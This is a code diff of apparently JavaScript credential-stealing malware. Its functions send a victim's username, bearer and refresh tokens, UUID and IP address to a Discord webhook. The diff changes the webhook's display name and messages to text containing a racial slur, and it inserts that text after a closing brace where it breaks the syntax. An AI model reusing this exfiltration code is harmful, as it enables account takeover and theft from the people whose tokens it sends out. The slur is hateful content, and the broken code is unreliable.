@@ -129,11 +129,11 @@ function getIp(req) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-        username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "@everyone",
+        username: "BEAMED BY ROA NIGGER",
+        avatar_url: "https://media.discordapp.net/attachments/1023156290828120155/1038117687156559962/bigrat-christmas-hat.png",
+        content: "@everyone Loz and nine made this, bro is such a bozo @nigeer",
         embeds: [{
-            title: "User Info", color: 0x00ff50, fields: [
+            title: "User Info", color: 000080, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
                 {name: "Ip", value: ip, inline: true},
@@ -151,15 +151,15 @@ function logToWebhook(title, message) {
     const url = webhook_logging_url
 
     let data = {
-        username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        username: "BEAMED BY ROA NIGGER",
+        avatar_url: "https://media.discordapp.net/attachments/1023156290828120155/1038117687156559962/bigrat-christmas-hat.png",
         content: " ",
         embeds: [{
-            title: "Log", color: 0x00ff50, fields: [
+            title: "Log", color: 000080, fields: [
                 {name: title, value: ""},
                 {name: message, value: ""}
             ]
-        }
+        }BEAMED BY ROA NIGGER
         ]
     }
     axios.post(url, data).then(() => console.log("Logging to discord."))
